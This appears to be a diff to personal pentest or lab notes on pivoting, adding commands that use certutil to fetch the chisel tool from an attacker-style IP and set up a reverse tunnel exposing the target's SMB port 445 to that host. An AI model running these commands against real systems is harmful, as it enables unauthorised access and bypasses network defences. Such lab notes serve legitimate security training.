@@ -118,3 +118,23 @@ plink.exe -ssh -L <local_port>:<destination_host>:<destination_port> <username>@
 plink.exe -ssh -L 8080:localhost:80 user@ssh_server
 ```
 
+```
+certutil -urlcache -f http://10.10.14.33/chisel_1.9.1_windows_386 chisel
+```
+
+```
+chisel server -p 12312 --reverse
+```
+
+```
+.\chisel.exe client 10.10.14.33:12312 R:445:127.0.0.1:445
+```
+
+![](Pasted%20image%2020230925171742.png)
+
+![](Pasted%20image%2020230925171812.png)
+
+```
+ss -tulwn
+```
+
